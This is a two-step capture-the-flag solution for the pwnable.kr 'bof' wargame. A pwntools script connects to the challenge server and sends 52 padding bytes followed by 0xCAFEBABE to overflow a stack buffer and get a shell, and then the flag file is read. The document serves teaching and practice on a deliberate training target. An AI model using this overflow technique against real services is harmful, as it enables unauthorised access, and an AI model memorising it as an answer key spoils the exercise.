1. Run this Python script (also in bof.py)
```
from pwn import *;
a = remote("pwnable.kr", 9000)
a.sendline(b'a'*52 + p32(0xCAFEBABE))
a.interactive()
```
2. Run `cat flag`
